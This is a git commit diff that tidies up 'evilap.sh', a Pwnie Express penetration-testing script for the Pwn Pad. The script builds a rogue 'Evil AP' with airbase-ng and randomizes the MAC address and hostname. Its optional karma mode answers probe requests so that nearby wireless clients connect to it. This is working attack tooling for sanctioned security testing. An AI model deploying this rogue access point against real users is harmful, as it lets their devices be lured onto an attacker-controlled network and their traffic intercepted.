ac0385beb053eaea2089dc288f743fae08101c81
Gabe Koss <gabe@gabekoss.com>
2014-01-18 12:16:15 -0500

    evil ap cleanup

--- scripts/evilap.sh
+++ scripts/evilap.sh
@@ -1,27 +1,24 @@
 #!/bin/bash
-#Date: Dec 2013
-#Desc: EvilAP script to forcefully connect wireless clients
-#Authors: Awk, Sedd, Pasties
-#Company: Pwnie Express
-#Version: 2.0
+# Date: Jan 2014
+# Desc: EvilAP script to forcefully connect wireless clients
+# Authors: Awk, Sedd, Pasties
+# Company: Pwnie Express
+# Version: 2.0
 
-#Set ctrl c (break) to stop evilap gracefully and restore orignal hostname and mac address
+# Set CTRL-c (break) to stop evilap gracefully and restore orignal hostname and mac address
 trap f_endclean INT
 trap f_endclean KILL
 
-
-##################################################
-f_restore_ident(){
+f_endclean(){
+  echo "[!] Exiting..."
+  f_clean_up
+  f_restore_ident
   ifconfig wlan1 down
-  macchanger -p wlan1
-  hostname pwnpad
+  exit
 }
 
-##################################################
 f_clean_up(){
-  echo
-  echo "Killing any previous instances of airbase or dhcpd"
-  echo
+  echo "[!] Killing any previous instances of airbase or dhcpd"
   killall airbase-ng
   killall dhcpd
   airmon-ng stop mon0
@@ -29,103 +26,88 @@ f_clean_up(){
   iptables --table nat --flush
 }
 
-##################################################
-f_endclean(){
-  f_clean_up
-  f_restore_ident
+f_restore_ident(){
+  echo "[!] Restoring network identity."
   ifconfig wlan1 down
-  exit
+  macchanger -p wlan1
+  hostname pwnpad
 }
 
-##################################################
-f_interface(){
+f_banner(){
   clear
+  echo "[+] Welcome to the EvilAP"
+  echo
+}
 
-    echo "		Welcome to the EvilAP"
-    echo
-    echo "Select which interface you are using for Internet? (1-3):"
-    echo
-    echo "1. [rmnet_usb0] (4G GSM connection)"
-    echo "2. eth0  (USB ethernet adapter)"
-    echo "3. wlan0  (Internal Nexus Wifi)"
-    echo
+f_interface(){
+  echo "[+] Select which interface you are using for Internet? (1-3):"
+  echo
+  echo "1. [rmnet_usb0] (4G GSM connection)"
+  echo "2. eth0  (USB ethernet adapter)"
+  echo "3. wlan0  (Internal Nexus Wifi)"
+  echo
+  read -p "Choice: " selection
 
-    read -p "Choice: " interfacechoice
-
-  case $interfacechoice in
-    1) f_rmnet_usb0 ;;
-    2) f_eth0 ;;
-    3) f_wlan0 ;;
-    *) f_rmnet_usb0 ;;
+  case $selection in
+    1) interface=rmnet_usb0 ;;
+    2) interface=eth0 ;;
+    3) interface=wlan0 ;;
+    *) interface=rmnet_usb0 ;;
   esac
 }
 
-#########################################
-f_rmnet_usb0(){
-  interface=rmnet_usb0
-}
-
-
-#########################################
-f_eth0(){
-  interface=eth0
-}
-
-#########################################
-f_wlan0(){
-  interface=wlan0
-}
-
-#########################################
 f_ssid(){
   clear
   echo
-  read -p "Enter an SSID name [Public_Wireless]: " ssid
+  echo "[+] Enter an SSID name. [Public_Wireless]"
+  read -p "SSID: " ssid
   echo
 
-  if [ -z $ssid ]
-  then
+  if [ -z $ssid ]; then
     ssid=Public_Wireless
   fi
 }
 
-########################################
 f_channel(){
-clear
-echo
-read -p "Enter the channel to run the EvilAP on (1-14): " channel
-echo
+  clear
+  echo
+  echo "[+] Enter the channel to run the EvilAP on (1-14)."
+  read -p "Channel:" channel
+  echo
+  case $channel in
+    [1-14]*) ;;
+    *) f_channel ;;
+  esac
 }
 
-#########################################
 f_preplaunch(){
   #Change the hostname and mac address randomly
 
-  ifconfig wlan1 down
-
-  macchanger -r wlan1
-
-  echo "Rolling MAC address and Hostname randomly:"
+  echo "[+] Rolling MAC address and Hostname randomly."
   echo
+
+  ifconfig wlan1 down
+  macchanger -r wlan1
 
   hn=`ifconfig wlan1 |grep HWaddr |awk '{print$5}' |awk -F":" '{print$1$2$3$4$5$6}'`
   hostname $hn
-
-  echo $hn
+  echo "[+] New hostname set: $hn"
 
   sleep 2
-
-  echo
-
   #Put wlan1 into monitor mode - mon0 created
   airmon-ng start wlan1
   mkdir /dev/net/
   ln -s /dev/tun /dev/net/tun
 }
-#########################################
+
+f_logname(){
+  echo "/opt/pwnix/captures/wireless/evilap-$(date +%s).log"
+}
+
 f_evilap(){
   #Log path and name
-  logname="/opt/pwnix/captures/wireless/evilap-$(date +%s).log"
+  logname=$(f_logname)
+  echo "[+] Creating new logfile: $logname"
 
   #Start Airbase-ng with -P for preferred networks
   airbase-ng -P -C 70 -c $channel -e "$ssid" -v mon0 > $logname 2>&1 &
@@ -144,10 +126,10 @@ f_evilap(){
   tail -f $logname
 }
 
-#########################################
 f_niceap(){
   #Log path and name
-  logname="/opt/pwnix/captures/wireless/evilap-$(date +%s).log"
+  logname=$(f_logname)
+  echo "[+] Creating new logfile: $logname"
 
   #Start Airbase-ng with -P for preferred networks
   airbase-ng -c $channel -e "$ssid" -v mon0 > $logname 2>&1 &
@@ -166,12 +148,10 @@ f_niceap(){
   tail -f $logname
 }
 
-#########################################
 f_karmaornot(){
-
   clear
   echo
-  echo "Force clients to connect based on their probe requests? [default yes]: "
+  echo "[+] Force clients to connect based on their probe requests? [default: yes]: "
   echo
   echo "WARNING: Everything will start connecting to you if yes is selected"
   echo
@@ -179,28 +159,28 @@ f_karmaornot(){
   echo "2. No"
   echo
   read -p "Choice: " karma
-
+  case $karma in
+    [1-2]*) ;;
+    *) f_karmaornot ;;
+  esac
 }
 
-#########################################
 f_run(){
   f_getmacaddress
   f_clean_up
+  f_banner
   f_interface
   f_ssid
   f_channel
   f_karmaornot
   f_preplaunch
-  if [ -z $karma ]
-  then
-    karma="1"
-  fi
 
-  if [ $karma -eq 1 ]
-  then
-  f_evilap
+  if [ $karma -eq 1 ]; then
+    echo "[+] Starting Evil AP with forced connection attack."
+    f_evilap
   else
-  f_niceap
+    echo "[+] Starting Evil AP without forced connection attack."
+    f_niceap
   fi
 }
 
